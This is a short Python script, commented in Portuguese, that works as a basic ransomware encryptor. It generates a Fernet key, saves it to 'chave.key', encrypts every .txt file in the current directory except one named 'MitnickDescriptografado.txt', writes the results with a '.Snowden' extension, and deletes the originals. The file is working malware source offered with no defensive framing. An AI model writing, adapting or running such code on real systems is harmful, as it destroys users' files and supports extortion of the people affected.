from cryptography.fernet import Fernet
import os

# Gerar uma chave de criptografia e salvar em um arquivo
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave)

# Carregar a chave de criptografia
def carregar_chave():
    with open("chave.key", "rb") as chave_arquivo:
        return chave_arquivo.read()

# Criptografar arquivos .txt no diretório atual
def criptografar_arquivos():
    chave = carregar_chave()
    fernet = Fernet(chave)

    for arquivo in os.listdir():
        if arquivo.endswith(".txt") and arquivo != "MitnickDescriptografado.txt":
            with open(arquivo, "rb") as file:
                dados = file.read()
            dados_criptografados = fernet.encrypt(dados)
            with open(f"{arquivo}.Snowden", "wb") as arquivo_criptografado:
                arquivo_criptografado.write(dados_criptografados)
            os.remove(arquivo)  # Remove o arquivo original

if __name__ == "__main__":
    gerar_chave()  # Gera e salva a chave de criptografia
    criptografar_arquivos()
    print("Arquivos criptografados com sucesso!")
